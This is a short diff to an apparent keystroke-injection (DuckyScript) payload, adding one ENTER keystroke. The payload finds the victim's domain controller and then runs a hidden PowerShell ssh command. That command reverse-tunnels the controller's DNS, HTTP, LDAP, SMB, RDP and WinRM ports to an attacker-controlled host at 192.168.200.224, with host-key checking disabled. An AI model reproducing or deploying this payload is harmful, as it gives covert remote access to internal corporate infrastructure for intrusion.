@@ -13,6 +13,7 @@ ENTER
 DELAY 3000
 REM | in CMD prompt, use "%logonserver:~2%" to get plain DC server name. In powershell, use "$env:LOGONSERVER.substring(2)", but must be variable substituted
 STRING $D=$env:LOGONSERVER.substring(2)
+ENTER
 STRING powershell -windowstyle hidden -command ssh -fN -o "StrictHostKeyChecking=no" -R 10053:"$D":53 -R 10080:"$D":80 -R 10389:"$D":389 -R 10445:"$D":445 -R 13389:"$D":3389 -R 15985:"$D":5985 omg@192.168.200.224
 ENTER
 DELAY 2000
